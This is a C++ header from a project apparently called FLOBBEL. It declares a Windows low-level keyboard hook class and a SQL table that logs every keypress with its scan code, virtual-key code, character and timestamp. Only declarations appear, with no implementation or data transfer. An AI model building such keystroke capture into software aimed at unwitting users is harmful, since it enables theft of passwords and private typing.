//
// Created by Chrystalkey on 02.07.2020.
//

#ifndef FLOBBEL_KEYPRESS_TYPE_H
#define FLOBBEL_KEYPRESS_TYPE_H

#include "../global_constants.h"
#include "info_type.h"
#include "windows.h"

static const std::string keypress_sql = "CREATE TABLE IF NOT EXISTS keypress_type("
                                        "id BIGINT PRIMARY KEY,"
                                        "up VARCHAR(1),"
                                        "scancode BIGINT,"
                                        "vkcode BIGINT,"
                                        "char VARCHAR(3),"
                                        "description VARCHAR(256),"
                                        "time BIGINT);";

typedef struct:public Info{
    uint8_t updown = 0; // down == updown%2 == 0; up == updown%2 == 1
    uint32_t scancode = 0;
    uint32_t vkcode = 0;
#ifdef __WIN32__
    wchar_t descr[5] = {0};
    std::wstring timestamp;
#else
    char descr[5] = {0};
    std::string timestamp;
#endif
} KeypressInfo;

class KeyboardCapture: public Capture {
public:
    explicit KeyboardCapture();
    ~KeyboardCapture();
private:
    static LRESULT llkeyhook(int nCode, WPARAM wParam, LPARAM lParam);
    static HHOOK keyboardHook;
    static bool exists;
};

#endif //FLOBBEL_KEYPRESS_TYPE_H
